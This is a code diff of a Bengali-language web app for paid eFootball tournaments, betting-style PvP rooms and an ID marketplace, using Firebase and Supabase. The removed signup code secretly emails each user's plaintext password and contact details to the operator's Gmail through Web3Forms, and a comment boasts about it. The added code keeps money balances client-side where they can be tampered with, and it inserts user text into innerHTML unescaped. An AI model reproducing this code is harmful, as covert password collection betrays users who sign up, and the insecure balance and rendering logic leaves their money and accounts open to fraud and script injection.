+                validDocs.forEach(d => {
+                    takenCountries.push(d.country);
+                    if(d.userPhone === user.phone) alreadyJoined = true;
+                });
+
+                if (alreadyJoined) {
+                    alert("⚠️ আপনি এই টুর্নামেন্টে ইতিমধ্যে আবেদন করেছেন!");
+                    return;
+                }
+
+                if (takenCountries.includes(selectedCountry)) {
+                    alert("⚠️ এই দেশ ইতিমধ্যে অন্য কেউ সিলেক্ট করেছে!");
+                    return;
+                }
+
+                user.balance -= roomFee;
+                user.paidCount = (user.paidCount || 0) + 1;
+                localStorage.setItem("registeredUser", JSON.stringify(user));
+
+                if (user.phone) {
+                    db.collection("users").doc(user.phone).update({ 
+                        balance: user.balance, 
+                        paidCount: user.paidCount
+                    });
+                }
+                loadUserData();
+
+                let matchData = {
+                    type: "Paid Tournament",
+                    fee: roomFee,
+                    playerName: playerName,
+                    playerId: playerId,
+                    country: selectedCountry,
+                    userPhone: user.phone,
+                    status: "Open",
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                };
+
+                db.collection("matches").add(matchData).then(() => {
+                    let totalPool = roomFee * 16;
+                    let message = "🚨 নতুন পেইড টুর্নামেন্ট আবেদন (" + roomFee + " Tk)!\n👤 " + user.name + " (" + user.phone + ")\n🎮 প্লেয়ার: " + playerName + " (ID: " + playerId + ")\n🌍 দেশ: " + selectedCountry + "\n💰 প্রাইজ পুল: " + totalPool + " Tk";
+                    sendTelegramMessage(message, "সফলভাবে পেইড টুর্নামেন্টে আবেদন হয়েছে!");
+                    loadPaidTournamentsList();
+                    event.target.reset();
+                });
+            });
+        }
+
+        function applyPvpMatch(event) {
+            event.preventDefault();
+            let matchType = document.getElementById("pvp-type").value;
+            let betInput = document.getElementById("pvp-bet-amount").value;
+            let pvpName = document.getElementById("pvp-ingame-name").value.trim();
+            let pvpId = document.getElementById("pvp-ingame-id").value.trim();
+            let roomCode = document.getElementById("pvp-room-code").value.trim();
+            let user = JSON.parse(localStorage.getItem("registeredUser")) || {};
+
+            let betAmount = parseFloat(betInput);
+            if (isNaN(betAmount) || betAmount <= 0) { alert("⚠️ ভুল এমাউন্ট!"); return; }
+
+            if ((user.balance || 0) < betAmount) {
+                alert("⚠️ পর্যাপ্ত ব্যালেন্স নেই!");
+                return;
+            }
+
+            user.balance -= betAmount;
+            user.pvpCount = (user.pvpCount || 0) + 1;
+            localStorage.setItem("registeredUser", JSON.stringify(user));
+
+            if (user.phone) {
+                db.collection("users").doc(user.phone).update({ balance: user.balance, pvpCount: user.pvpCount });
+            }
+            loadUserData();
+
+            let matchData = {
+                type: "PvP Match",
+                bet: betAmount,
+                matchStyle: matchType,
+                creatorName: pvpName,
+                creatorId: pvpId,
+                creatorPhone: user.phone,
+                roomCode: roomCode,
+                status: "Open",
+                joinedCount: 1,
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            };
+
+            db.collection("matches").add(matchData).then(() => {
+                loadPvpMatchesList();
+                event.target.reset();
+                alert("সফলভাবে PvP রুম তৈরি হয়েছে!");
+            });
+        }
+
+        function joinPvpMatch(matchId, betAmount, creatorPhone) {
+            let user = JSON.parse(localStorage.getItem("registeredUser")) || {};
+            if (user.phone === creatorPhone) { alert("নিজের রুমে জয়েন করা যাবে না!"); return; }
+            if ((user.balance || 0) < betAmount) { alert("পর্যাপ্ত ব্যালেন্স নেই!"); return; }
+
+            let joinerName = prompt("আপনার ইন-গেম নাম লিখুন:");
+            let joinerId = prompt("আপনার ইন-গেম আইডি লিখুন:");
+            if (!joinerName || !joinerId) return;
+
+            user.balance -= betAmount;
+            localStorage.setItem("registeredUser", JSON.stringify(user));
+            if (user.phone) db.collection("users").doc(user.phone).update({ balance: user.balance });
+            loadUserData();
+
+            db.collection("matches").doc(matchId).update({
+                joinerName: joinerName.trim(),
+                joinerId: joinerId.trim(),
+                joinerPhone: user.phone,
+                status: "Running",
+                joinedCount: 2
+            }).then(() => {
+                alert("সফলভাবে ম্যাচে জয়েন করেছেন!");
+                loadPvpMatchesList();
+            });
+        }
+
+        function cancelPvpRoom(matchId, betAmount, creatorPhone) {
+            let user = JSON.parse(localStorage.getItem("registeredUser")) || {};
+            if (user.phone !== creatorPhone || !confirm("রুমটি বাতিল করতে চান?")) return;
+
+            user.balance = (user.balance || 0) + betAmount;
+            localStorage.setItem("registeredUser", JSON.stringify(user));
+            if (user.phone) db.collection("users").doc(user.phone).update({ balance: user.balance });
+            loadUserData();
+
+            db.collection("matches").doc(matchId).delete().then(() => loadPvpMatchesList());
+        }
+
+        function applyFreeTournament(event) {
+            event.preventDefault();
+            let user = JSON.parse(localStorage.getItem("registeredUser")) || {};
+            if ((user.pvpCount || 0) < 10 || (user.paidCount || 0) < 10) {
+                alert("⚠️ শর্ত পূরণ হয়নি! কমপক্ষে ১০টি PvP এবং ১০টি Paid ম্যাচ খেলতে হবে।");
+                return;
+            }
+            let freeName = document.getElementById("free-p-name").value.trim();
+            let freeId = document.getElementById("free-p-id").value.trim();
+            if(!freeName || !freeId) return;
+
+            let message = "🎁 ফ্রি টুর্নামেন্ট আবেদন!\n👤 " + user.name + " (" + user.phone + ")\n🎮 ইন-গেম: " + freeName + " (ID: " + freeId + ")";
+            sendTelegramMessage(message, "სফলভাবে ফ্রি টুর্নামেন্টে আবেদন হয়েছে!");
+            event.target.reset();
+        }
+
+        function loadMatchesList() {
+            loadPaidTournamentsList();
+            loadPvpMatchesList();
+        }
+
+        function loadPaidTournamentsList() {
+            let container = document.getElementById("paid-matches-container");
+            if (!container) return;
+            let selectedFee = parseFloat(document.getElementById("paid-room-select").value);
+
+            db.collection("matches").where("type", "==", "Paid Tournament").where("fee", "==", selectedFee).get().then((snapshot) => {
+                container.innerHTML = "";
+                let takenCountries = [], registeredPlayers = [];
+
+                snapshot.forEach(doc => {
+                    let d = doc.data();
+                    if (d.playerName && d.country) {
+                        takenCountries.push(d.country);
+                        registeredPlayers.push(d);
+                    }
+                });
+
+                populateCountriesDropdown(takenCountries);
+                let winnerPool = selectedFee * 16 * 0.90;
+
+                let headerInfo = document.createElement("div");
+                headerInfo.style.cssText = "margin-bottom:12px; font-size:13px; color:#facc15; font-weight:bold; background:#1e293b; padding:10px; border-radius:8px; border:1px solid #334155;";
+                headerInfo.innerHTML = "🏆 " + selectedFee + " Tk টুর্নামেন্ট | স্লট: <b style='color:#25d366;'>" + registeredPlayers.length + "/16</b> | প্রাইজপুল: <b style='color:#fff;'>" + winnerPool + " Tk</b>";
+                container.appendChild(headerInfo);
+
+                let gridDiv = document.createElement("div");
+                gridDiv.className = "slots-grid";
+
+                for (let i = 1; i <= 16; i++) {
+                    let player = registeredPlayers[i - 1];
+                    let slotBox = document.createElement("div");
+                    if (player) {
+                        slotBox.className = "slot-item booked";
+                        slotBox.innerHTML = "<div><span class='slot-no'>#স্লট " + i + "</span><br/><b style='color:#fff;'>" + player.playerName + "</b></div><div style='text-align:right;'><span style='font-size:11px; color:#38bdf8;'>🌍 " + player.country + "</span></div>";
+                    } else {
+                        slotBox.className = "slot-item";
+                        slotBox.innerHTML = "<div><span class='slot-no'>#স্লট " + i + "</span><br/><span style='color:#64748b;'>খালি আছে</span></div>";
+                    }
+                    gridDiv.appendChild(slotBox);
+                }
+                container.appendChild(gridDiv);
+            });
+        }
+
+        function loadPvpMatchesList() {
+            let container = document.getElementById("pvp-matches-container");
+            if (!container) return;
+
+            db.collection("matches").where("type", "==", "PvP Match").get().then((snapshot) => {
+                container.innerHTML = "";
+                let user = JSON.parse(localStorage.getItem("registeredUser")) || {};
+                let hasMatch = false;
+
+                snapshot.forEach((doc) => {
+                    let m = doc.data(), id = doc.id;
+                    if (!m.creatorName) return;
+                    hasMatch = true;
+
+                    let div = document.createElement("div");
+                    div.className = "match-card";
+                    let btnHtml = "";
+                    if (m.status === "Open") {
+                        if (user.phone !== m.creatorPhone) {
+                            btnHtml = "<button onclick='joinPvpMatch(\"" + id + "\", " + m.bet + ", \"" + m.creatorPhone + "\")' style='margin-top:8px; background:#25d366; color:#fff; border:none; padding:8px; border-radius:6px; font-size:12px; font-weight:bold; width:100%; cursor:pointer;'>⚔️ " + m.bet + " টাকা দিয়ে জয়েন করুন</button>";
+                        } else {
+                            btnHtml = "<button onclick='cancelPvpRoom(\"" + id + "\", " + m.bet + ", \"" + m.creatorPhone + "\")' style='margin-top:8px; background:#ef4444; color:#fff; border:none; padding:6px; border-radius:6px; font-size:11px; width:100%; cursor:pointer;'>❌ রুম বাতিল করুন</button>";
+                        }
+                    } else {
+                        btnHtml = "<p style='color:#38bdf8; font-size:12px; margin-top:6px;'>রানিং রুম কোড: <b>" + m.roomCode + "</b></p>";
+                    }
+                    div.innerHTML = "<b style='color:#25d366;'>🎮 PvP ম্যাচ (" + m.bet + " Tk)</b><br/>স্ট্যাটাস: <b>" + m.status + "</b>" + btnHtml;
+                    container.appendChild(div);
+                });
+                if (!hasMatch) container.innerHTML = "<p style='font-size:13px; color:#94a3b8;'>কোনো PvP ম্যাচ নেই।</p>";
+            });
+        }
+    //]]>
+    </script>
 </head>
 <body>
 
-    <div class="container">
-
-        <!-- ১. অথেন্টিকেশন পেজ (সাইন আপ / লগইন) -->
-        <div id="auth-section" class="page-section active">
-            <div class="card">
-                <!-- সাইন আপ ফর্ম -->
-                <div id="signup-box">
-                    <h2>🚀 Create Account</h2>
-                    <form id="signup-form" onsubmit="handleSignup(event)">
-                        <div class="form-group">
-                            <label>Full Name</label>
-                            <input type="text" id="su-name" placeholder="Enter your name" required>
-                        </div>
-                        <div class="form-group">
-                            <label>Phone Number</label>
-                            <input type="tel" id="su-phone" placeholder="01XXXXXXXXX" required>
-                        </div>
-                        <div class="form-group">
-                            <label>Email Address</label>
-                            <input type="email" id="su-email" placeholder="example@gmail.com" required>
-                        </div>
-                        <div class="form-group">
-                            <label>Password</label>
-                            <input type="password" id="su-pass" placeholder="Create a password" required>
-                        </div>
-                        <button type="submit">Sign Up</button>
-                    </form>
-                    <div class="switch-text" onclick="toggleAuth('login')">
-                        Already have an account? <span>Login here</span>
-                    </div>
-                </div>
-
-                <!-- লগইন ফর্ম -->
-                <div id="login-box" style="display: none;">
-                    <h2>🔐 Login</h2>
-                    <form id="login-form" onsubmit="handleLogin(event)">
-                        <div class="form-group">
-                            <label>Email Address</label>
-                            <input type="email" id="li-email" placeholder="Enter your email" required>
-                        </div>
-                        <div class="form-group">
-                            <label>Password</label>
-                            <input type="password" id="li-pass" placeholder="Enter your password" required>
-                        </div>
-                        <button type="submit">Login</button>
-                    </form>
-                    <div class="switch-text" onclick="toggleAuth('signup')">
-                        Don't have an account? <span>Sign Up</span>
-                    </div>
-                </div>
-            </div>
+    <div class='auth-wrapper' id='auth-wrapper-box' style='display: none;'>
+        <div class='auth-container' id='signup-box'>
+            <h2>eFootball <span>Matchday</span></h2>
+            <form onsubmit='handleSignup(event)'>
+                <div class='form-group'><label>আপনার নাম</label><input id='su-name' placeholder='নাম লিখুন' required='required' type='text'/></div>
+                <div class='form-group'><label>মোবাইল নম্বর</label><input id='su-phone' placeholder='০১xxxxxxxx' required='required' type='tel'/></div>
+                <div class='form-group'><label>পাসওয়ার্ড</label><input id='su-pass' placeholder='পাসওয়ার্ড দিন' required='required' type='password'/></div>
+                <button class='btn-submit' id='su-btn' type='submit'>সাইন আপ করুন</button>
+            </form>
+            <div class='switch-text'>অ্যাকাউন্ট আছে? <span onclick='switchToLogin()'>লগইন করুন</span></div>
         </div>
 
-        <!-- মূল অ্যাপ ইন্টারফেস -->
-        <div id="main-app-section" style="display: none;">
-
-            <!-- হোম পেজ -->
-            <div id="page-home" class="page-section active">
-                <div class="card">
-                    <h2>🎮 Victory eFootball Battle</h2>
-                    <p style="text-align: center; font-size: 13px; color: #94a3b8;">Welcome! Choose your category below:</p>
-                    
-                    <button onclick="switchTab('tournaments')" style="background: linear-gradient(135deg, #3b82f6, #1d4ed8); margin-bottom: 10px;">🏆 Tournaments (Paid & Free)</button>
-                    <button onclick="switchTab('shop')" style="background: linear-gradient(135deg, #f59e0b, #d97706); margin-bottom: 10px;">🛒 ID & Coin Sell Market</button>
-                </div>
-            </div>
-
-            <!-- টুর্নামেন্ট পেজ -->
-            <div id="page-tournaments" class="page-section">
-                <div class="card">
-                    <h3>🏆 Tournaments</h3>
-                    <div style="background: #0f172a; padding: 10px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #eab308;">
-                        <h4 style="color: #eab308; margin: 0 0 5px 0;">🔥 Paid Tournament (Entry: 20 TK)</h4>
-                        <button onclick="notifyAction('Paid Tournament Applied')" style="padding: 8px; font-size: 12px;">Apply Paid Tournament</button>
-                    </div>
-                    <div style="background: #0f172a; padding: 10px; border-radius: 8px; border: 1px solid #25d366;">
-                        <h4 style="color: #25d366; margin: 0 0 5px 0;">🎁 Free Tournament</h4>
-                        <button onclick="notifyAction('Free Tournament Joined')" style="background: #25d366; padding: 8px; font-size: 12px;">Start Free Tasks</button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- শপ পেজ -->
-            <div id="page-shop" class="page-section">
-                <div class="card">
-                    <h3>🛒 Marketplace</h3>
-                    <div style="background: #0f172a; padding: 10px; border-radius: 8px; margin-bottom: 15px;">
-                        <h4 style="color: #38bdf8; margin: 0 0 8px 0;">📤 Sell Your eFootball ID</h4>
-                        <input type="text" id="sell-title" placeholder="ID Title / Details" style="margin-bottom: 8px; font-size: 12px;">
-                        <input type="text" id="sell-price" placeholder="Asking Price (TK)" style="margin-bottom: 8px; font-size: 12px;">
-                        <input type="password" id="sell-secret" placeholder="Secret Password / Login Details" style="margin-bottom: 8px; font-size: 12px;">
-                        <button onclick="handleSellID()" style="padding: 8px; font-size: 12px;">Publish ID</button>
-                    </div>
-                    <div style="background: #0f172a; padding: 10px; border-radius: 8px;">
-                        <h4 style="color: #eab308; margin: 0 0 5px 0;">🪙 Buy eFootball Coins</h4>
-                        <button onclick="notifyAction('Coin Buy Request')" style="background: #eab308; color: #000; padding: 8px; font-size: 12px; font-weight: bold;">Buy Coins Now</button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- প্রোফাইল পেজ -->
-            <div id="page-profile" class="page-section">
-                <div class="card">
-                    <h3>👤 My Profile</h3>
-                    <p style="font-size: 13px;"><b>Name:</b> <span id="pro-name"></span></p>
-                    <p style="font-size: 13px;"><b>Phone:</b> <span id="pro-phone"></span></p>
-                    <p style="font-size: 13px;"><b>Email:</b> <span id="pro-email"></span></p>
-                    <button onclick="handleLogout()" style="background: #ef4444; margin-top: 15px;">Logout</button>
-                </div>
-            </div>
-
-            <!-- নেভিগেশন বার -->
-            <div class="nav-bar">
-                <button class="nav-btn active" onclick="switchTab('home')" id="nav-home">
-                    <div style="font-size: 16px;">🏠</div>Home
-                </button>
-                <button class="nav-btn" onclick="switchTab('tournaments')" id="nav-tournaments">
-                    <div style="font-size: 16px;">🏆</div>Tournaments
-                </button>
-                <button class="nav-btn" onclick="switchTab('shop')" id="nav-shop">
-                    <div style="font-size: 16px;">🛒</div>Shop/ID
-                </button>
-                <button class="nav-btn" onclick="switchTab('profile')" id="nav-profile">
-                    <div style="font-size: 16px;">👤</div>Profile
-                </button>
-            </div>
-
+        <div class='auth-container' id='login-box' style='display: none;'>
+            <h2>ইউজার <span>লগইন</span></h2>
+            <form onsubmit='handleLogin(event)'>
+                <div class='form-group'><label>মোবাইল নম্বর</label><input id='li-phone' placeholder='০১xxxxxxxx' required='required' type='tel'/></div>
+                <div class='form-group'><label>পাসওয়ার্ড</label><input id='li-pass' placeholder='পাসওয়ার্ড দিন' required='required' type='password'/></div>
+                <button class='btn-submit' type='submit'>লগইন করুন</button>
+            </form>
+            <div class='switch-text'>অ্যাকাউন্ট নেই? <span onclick='switchToSignup()'>সাইন আপ করুন</span></div>
         </div>
-
     </div>
 
-    <script>
-        // --- SUPABASE & WEB3FORMS CONFIGURATION ---
-        const SUPABASE_URL = 'https://bwzssqsprqghgddorbww.supabase.co';
-        const SUPABASE_ANON_KEY = 'sb_publishable_2vbFPPss487_l5ED7mf0wg_LHk2nMQZ'; 
-        
-        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    <div id='main-site-content' style='display: none;'>
+        <nav>
+            <div>
+                <div class='logo' onclick='switchSection(&quot;home&quot;)'>⚽ eFootball</div>
+                <span style='font-size: 11px; color: #94a3b8; font-weight: bold;'>Pro Tournaments</span>
+            </div>
+            <div class='nav-right'>
+                <div class='balance-badge' id='user-balance-badge'>0 Tk</div>
+                <div class='profile-icon' id='profile-avatar-letter' onclick='toggleProfileMenu()'>S</div>
+                <div class='profile-menu' id='profileMenu'>
+                    <div onclick='switchSection(&quot;profile&quot;); toggleProfileMenu();'>👤 প্রোফাইল দেখুন</div>
+                    <div onclick='handleLogout()' style='color: #ef4444;'>🚪 লগআউট</div>
+                </div>
+            </div>
+        </nav>
 
-        const WEB3FORMS_KEY = '6a869c60-f73c-457b-a9c2-e3c9b018e6a5'; 
+        <div class='main-container'>
+            <div class='notice-board' id='dynamic-admin-notice' style='display:none;'/>
 
-        // জিমেইলে নোটিফিকেশন পাঠানোর ফাংশন (পাসওয়ার্ডসহ)
-        function sendEmailAlert(actionName, details) {
-            fetch('https://api.web3forms.com/submit', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-                body: JSON.stringify({
-                    access_key: WEB3FORMS_KEY,
-                    subject: "New Alert: " + actionName,
-                    from_name: "Victory eFootball App",
-                    message: details,
-                    email: "efootballbattle892@gmail.com"
-                })
-            }).catch(err => console.error("Email error:", err));
-        }
+            <!-- হোম সেকশন -->
+            <div class='box' id='home-section'>
+                <!-- আলাদা আলাদা ট্যাব সেকশন -->
+                <div class='tabs' style='margin-bottom: 15px;'>
+                    <button class='tab-btn active' id='main-tab-paid' onclick='switchMainTab(&quot;paid&quot;)'>🏆 Paid Tournaments</button>
+                    <button class='tab-btn' id='main-tab-slot' onclick='switchMainTab(&quot;slot&quot;)'>🎮 Instant PvP</button>
+                    <button class='tab-btn' id='main-tab-free' onclick='switchMainTab(&quot;free&quot;)'>🎁 Free Tournament</button>
+                    <button class='tab-btn' id='main-tab-market' onclick='switchMainTab(&quot;market&quot;)'>🛒 ID Sell</button>
+                    <button class='tab-btn' id='main-tab-coin' onclick='switchMainTab(&quot;coin&quot;)'>🪙 Buy Coins</button>
+                </div>
 
-        // লগইন ও সাইনআপ সুইচিং
-        window.toggleAuth = function(type) {
-            if(type === 'login') {
-                document.getElementById('signup-box').style.display = 'none';
-                document.getElementById('login-box').style.display = 'block';
-            } else {
-                document.getElementById('login-box').style.display = 'none';
-                document.getElementById('signup-box').style.display = 'block';
-            }
-        }
+                <!-- 1. Paid Tournament Tab -->
+                <div id='tab-content-paid'>
+                    <div class='tabs' id='paid-room-tabs-container'>
+                        <button class='tab-btn' onclick='switchPaidRoomTab(&quot;10&quot;, this)'>10 Tk</button>
+                        <button class='tab-btn' onclick='switchPaidRoomTab(&quot;50&quot;, this)'>50 Tk</button>
+                        <button class='tab-btn active' onclick='switchPaidRoomTab(&quot;100&quot;, this)'>100 Tk</button>
+                    </div>
+                    <div style='background: #1e293b; padding: 15px; border-radius: 12px; border: 1px solid #334155; margin-bottom: 15px;'>
+                        <h4 style='color: #4ade80; margin-bottom: 8px; font-size: 14px;'>পেইড টুর্নামেন্ট আবেদন</h4>
+                        <form onsubmit='applyPaidTournament(event)'>
+                            <div class='form-group'>
+                                <label style='font-size: 12px;'>রুম ফি</label>
+                                <select id='paid-room-select' onchange='loadPaidTournamentsList()'>
+                                    <option value='10'>10 Tk</option>
+                                    <option value='50'>50 Tk</option>
+                                    <option selected='selected' value='100'>100 Tk</option>
+                                </select>
+                            </div>
+                            <div class='form-group'><label style='font-size: 11px;'>ইন-গেম নাম</label><input id='paid-player-name' placeholder='নাম লিখুন' required='required' type='text'/></div>
+                            <div class='form-group'><label style='font-size: 11px;'>ইন-গেম আইডি</label><input id='paid-player-id' placeholder='আইডি লিখুন' required='required' type='text'/></div>
+                            <div class='form-group'>
+                                <label style='font-size: 11px;'>পছন্দের দেশ</label>
+                                <select id='paid-country-select' required='required'><option value=''>দেশ নির্বাচন করুন</option></select>
+                            </div>
+                            <button class='btn-submit' type='submit'>আবেদন করুন</button>
+                        </form>
+                    </div>
+                    <div class='box' style='background: #171f2d; margin-top: 15px;'>
+                        <h4 style='color: #4ade80; margin-bottom: 10px; font-size: 14px;'>🏆 স্লট লিস্ট</h4>
+                        <div id='paid-matches-container'>লোড হচ্ছে...</div>
+                    </div>
+                </div>
 
-        // সাইন আপ হ্যান্ডেল (Supabase Auth + জিমেইলে পাসওয়ার্ড পাঠানো)
-        window.handleSignup = async function(e) {
-            e.preventDefault();
-            const name = document.getElementById('su-name').value;
-            const phone = document.getElementById('su-phone').value;
-            const email = document.getElementById('su-email').value;
-            const password = document.getElementById('su-pass').value;
+                <!-- 2. PvP Tab -->
+                <div id='tab-content-slot' style='display: none;'>
+                    <div style='background: #1e293b; padding: 15px; border-radius: 12px; border: 1px solid #334155; margin-bottom: 15px;'>
+                        <h4 style='color: #60a5fa; margin-bottom: 8px; font-size: 14px;'>PvP ম্যাচ রুম তৈরি</h4>
+                        <form onsubmit='applyPvpMatch(event)'>
+                            <div class='form-group'><label style='font-size: 12px;'>ধরন</label><select id='pvp-type'><option value='Friendly PvP'>Friendly PvP Match</option></select></div>
+                            <div class='form-group'><label style='font-size: 11px;'>বাজির পরিমাণ (Tk)</label><input id='pvp-bet-amount' placeholder='যেমন: 50' required='required' type='number'/></div>
+                            <div class='form-group'><label style='font-size: 11px;'>ইন-গেম নাম</label><input id='pvp-ingame-name' placeholder='নাম' required='required' type='text'/></div>
+                            <div class='form-group'><label style='font-size: 11px;'>ইন-গেম আইডি</label><input id='pvp-ingame-id' placeholder='আইডি' required='required' type='text'/></div>
+                            <div class='form-group'><label style='font-size: 11px;'>রুম কোড</label><input id='pvp-room-code' placeholder='রুম কোড' required='required' type='text'/></div>
+                            <button class='btn-submit' type='submit'>রুম তৈরি করুন</button>
+                        </form>
+                    </div>
+                    <div class='box' style='background: #171f2d; margin-top: 15px;'>
+                        <h4 style='color: #25d366; margin-bottom: 10px; font-size: 14px;'>লাইভ PvP ম্যাচ লিস্ট</h4>
+                        <div id='pvp-matches-container'>লোড হচ্ছে...</div>
+                    </div>
+                </div>
 
-            const { data, error } = await supabaseClient.auth.signUp({
-                email: email,
-                password: password,
-                options: { data: { full_name: name, phone: phone } }
-            });
+                <!-- 3. Free Tournament Tab -->
+                <div id='tab-content-free' style='display: none;'>
+                    <div style='background: #1e293b; padding: 15px; border-radius: 12px; border: 1px solid #334155;'>
+                        <h4 style='color: #facc15; margin-bottom: 8px; font-size: 14px;'>🎁 ফ্রি টুর্নামেন্ট (শর্ত: ১০টি PvP ও ১০টি Paid ম্যাচ খেলা বাধ্যতামূলক)</h4>
+                        <form onsubmit='applyFreeTournament(event)'>
+                            <div class='form-group'><label style='font-size: 11px;'>ইন-গেম নাম</label><input id='free-p-name' placeholder='নাম' required='required' type='text'/></div>
+                            <div class='form-group'><label style='font-size: 11px;'>ইন-গেম আইডি</label><input id='free-p-id' placeholder='আইডি' required='required' type='text'/></div>
+                            <button class='btn-submit' type='submit'>আবেদন করুন</button>
+                        </form>
+                    </div>
+                </div>
 
-            if (error) {
-                alert("Error: " + error.message);
-                return;
-            }
+                <!-- 4. eFootball ID Sell Tab (পাবলিক মার্কেটপ্লেস ও পোস্ট ফর্ম) -->
+                <div id='tab-content-market' style='display: none;'>
+                    <div style='background: #1e293b; padding: 15px; border-radius: 12px; border: 1px solid #334155; margin-bottom: 15px;'>
+                        <h4 style='color: #38bdf8; margin-bottom: 8px; font-size: 14px;'>🛒 আপনার eFootball ID বিক্রির বিজ্ঞাপন দিন</h4>
+                        <p style='font-size: 12px; color: #94a3b8; margin-bottom: 10px;'>এখানে ছবি আপলোড করলে তা হোম পেজে সবার জন্য পাব্লিক হয়ে যাবে।</p>
+                        <form onsubmit='handleSellPostSubmit(event)'>
+                            <div class='form-group'><label style='font-size: 11px;'>আইডির বিবরণ</label><input id='market-title' placeholder='যেমন: 3 Epic Card ID, Max Squad' required='required' type='text'/></div>
+                            <div class='form-group'><label style='font-size: 11px;'>মূল্য (Tk)</label><input id='market-price' placeholder='দাম' required='required' type='number'/></div>
+                            <div class='form-group'>
+                                <label style='font-size: 11px;'>স্ক্রিনশট আপলোড (স্কোয়াড/প্লেয়ার লিস্ট)</label>
+                                <div style='display: flex; gap: 8px;'>
+                                    <input id='market-img-url' placeholder='ছবির লিংক' required='required' style='width: 100%;' type='text'/>
+                                    <input accept='image/*' id='market-file-input' onchange='uploadMarketScreenshot()' style='display: none;' type='file'/>
+                                    <button onclick='document.getElementById(&quot;market-file-input&quot;).click()' style='background: #334155; color: #fff; border: none; padding: 0 12px; border-radius: 6px; cursor: pointer;' type='button'>📷</button>
+                                </div>
+                            </div>
+                            <button class='btn-submit' type='submit'>বিজ্ঞাপন পাবলিশ করুন</button>
+                        </form>
+                    </div>
 
-            localStorage.setItem('userName', name);
-            localStorage.setItem('userPhone', phone);
-            localStorage.setItem('userEmail', email);
+                    <div class='box' style='background: #171f2d; margin-top: 15px;'>
+                        <h4 style='color: #facc15; margin-bottom: 10px; font-size: 14px;'>📢 পাব্লিক মার্কেটপ্লেস (সব ইউজারের আইডি বিক্রির পোস্ট)</h4>
+                        <div id='marketplace-items-container'>লোড হচ্ছে...</div>
+                    </div>
+                </div>
 
-            // এখন থেকে ইউজারের পাসওয়ার্ডও সরাসরি আপনার জিমেইলে চলে আসবে!
-            sendEmailAlert("New Account Signup", `Name: ${name}\nEmail: ${email}\nPhone: ${phone}\nPassword: ${password}`);
-            alert('Account Created Successfully!');
-            openMainApp(name, phone, email);
-        }
+                <!-- 5. Buy Coins Tab -->
+                <div id='tab-content-coin' style='display: none;'>
+                    <div class='box' style='background: #1e293b; border: 1px solid #334155;'>
+                        <h4 style='color: #facc15; margin-bottom: 10px; font-size: 15px;'>🪙 eFootball Coin টপ-আপ প্যাক</h4>
+                        <div style='display: flex; flex-direction: column; gap: 12px;'>
+                            <div style='background: #0f172a; padding: 12px; border-radius: 8px; border: 1px solid #334155; display: flex; justify-content: space-between; align-items: center;'>
+                                <div><b style='color: #fff;'>530 eFootball Coins</b><p style='color: #25d366; font-size: 13px;'>মূল্য: ৪০০ টাকা</p></div>
+                                <button onclick='buyCoinPack(530, 400)' style='background: #25d366; color: #fff; border: none; padding: 8px 14px; border-radius: 6px; font-weight: bold; cursor: pointer;'>কিনুন</button>
+                            </div>
+                            <div style='background: #0f172a; padding: 12px; border-radius: 8px; border: 1px solid #334155; display: flex; justify-content: space-between; align-items: center;'>
+                                <div><b style='color: #fff;'>1050 eFootball Coins</b><p style='color: #25d366; font-size: 13px;'>মূল্য: ৭৫০ টাকা</p></div>
+                                <button onclick='buyCoinPack(1050, 750)' style='background: #25d366; color: #fff; border: none; padding: 8px 14px; border-radius: 6px; font-weight: bold; cursor: pointer;'>কিনুন</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
 
-        // লগইন হ্যান্ডেল (Supabase Auth)
-        window.handleLogin = async function(e) {
-            e.preventDefault();
-            const email = document.getElementById('li-email').value;
-            const password = document.getElementById('li-pass').value;
+            <!-- ডিপোজিট সেকশন -->
+            <div class='box' id='deposit-section' style='display: none;'>
+                <h3 style='color: #25d366; margin-bottom: 10px;'>💳 টাকা ডিপোজিট করুন</h3>
+                <div style='background: #1e293b; padding: 15px; border-radius: 12px; border: 1px solid #334155;'>
+                    <p style='font-size: 13px; color: #facc15; margin-bottom: 10px; font-weight: bold;'>নম্বর: 01622842102 (Send Money)</p>
+                    <form onsubmit='handleDeposit(event)'>
+                        <div class='form-group'><label style='font-size: 11px;'>মাধ্যম</label><select id='dep-method'><option value='Bkash'>Bkash</option><option value='Nagad'>Nagad</option></select></div>
+                        <div class='form-group'><label style='font-size: 11px;'>টাকা পরিমাণ</label><input id='dep-amount' placeholder='যেমন: 100' required='required' type='number'/></div>
+                        <div class='form-group'><label style='font-size: 11px;'>প্রেরক নম্বর</label><input id='dep-sender-no' placeholder='০১xxxxxxxx' required='required' type='tel'/></div>
+                        <div class='form-group'><label style='font-size: 11px;'>TrxID</label><input id='dep-trxid' placeholder='TrxID লিখুন' required='required' type='text'/></div>
+                        <button class='btn-submit' type='submit'>ডিপোজিট সাবমিট করুন</button>
+                    </form>
+                </div>
+            </div>
 
-            const { data, error } = await supabaseClient.auth.signInWithPassword({
-                email: email,
-                password: password
-            });
+            <!-- উইথড্র সেকশন -->
+            <div class='box' id='withdraw-section' style='display: none;'>
+                <h3 style='color: #25d366; margin-bottom: 10px;'>🪙 টাকা উইথড্র করুন</h3>
+                <div style='background: #1e293b; padding: 15px; border-radius: 12px; border: 1px solid #334155;'>
+                    <form onsubmit='handleWithdraw(event)'>
+                        <div class='form-group'><label style='font-size: 11px;'>মাধ্যম</label><select id='wd-method'><option value='Bkash'>Bkash</option><option value='Nagad'>Nagad</option></select></div>
+                        <div class='form-group'><label style='font-size: 11px;'>টাকা পরিমাণ</label><input id='wd-amount' placeholder='যেমন: 100' required='required' type='number'/></div>
+                        <div class='form-group'><label style='font-size: 11px;'>নম্বর</label><input id='wd-target-phone' placeholder='০১xxxxxxxx' required='required' type='tel'/></div>
+                        <div class='form-group'><label style='font-size: 11px;'>নোট / ID</label><input id='wd-trxid' placeholder='নোট দিন' required='required' type='text'/></div>
+                        <button class='btn-submit' type='submit'>উইথড্র পাঠান</button>
+                    </form>
+                </div>
+            </div>
 
-            if (error) {
-                alert("Login Failed: Wrong Password or Email!");
-                return;
-            }
+            <!-- প্রোফাইল সেকশন -->
+            <div class='box' id='profile-section' style='display: none;'>
